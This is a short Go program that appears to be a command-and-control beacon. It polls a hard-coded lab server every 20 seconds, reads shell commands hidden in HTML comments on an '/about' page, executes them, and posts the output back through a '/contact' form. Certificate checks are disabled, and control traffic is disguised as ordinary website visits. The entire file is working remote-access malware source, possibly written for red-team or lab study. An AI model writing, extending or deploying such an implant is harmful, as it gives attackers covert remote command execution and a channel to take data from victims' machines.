package main

import (
	"crypto/tls"
	"io"
	"net/http"
	"net/url"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

const (
	server     = "https://192.168.93.133:4443"
	agentID    = "agent01"
	beaconFreq = 20 * time.Second
)

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // dev only!
	},
}

func fetchTask() string {
	resp, err := client.Get(server + "/about?id=" + agentID)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	// Look for <!--cmd:...--> in HTML
	re := regexp.MustCompile(`<!--cmd:(.*?)-->`)
	match := re.FindStringSubmatch(string(body))
	if len(match) > 1 {
		return match[1]
	}
	return ""
}

func sendResponse(result string) {
	data := url.Values{}
	data.Set("id", agentID)
	data.Set("msg", result)

	client.PostForm(server+"/contact", data)
}

func execute(cmd string) string {
	parts := strings.Fields(cmd)
	out, err := exec.Command(parts[0], parts[1:]...).CombinedOutput()
	if err != nil {
		return err.Error() + ": " + string(out)
	}
	return string(out)
}

func main() {
	for {
		task := fetchTask()
		if task != "" {
			result := execute(task)
			sendResponse(result)
		}
		time.Sleep(beaconFreq)
	}
}
